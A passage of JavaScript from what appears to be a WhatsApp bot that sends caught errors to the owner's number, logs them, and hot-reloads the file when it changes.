sam.sendMessage(global.ownMain + "@s.whatsapp.net", {
text: require("util").format(err)
}, {
quoted: m
})
new Promise(resolve => setTimeout(resolve, 2000))
/*m.reply(`!Eror, error details will be sent to bot contributors ✓

${util.format(err)}`)*/
console.log(util.format(err))
}
handleError()
}
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
fs.unwatchFile(file);
console.log(color(`Update ${__filename}`, "green"))
delete require.cache[file];
require(file);
});
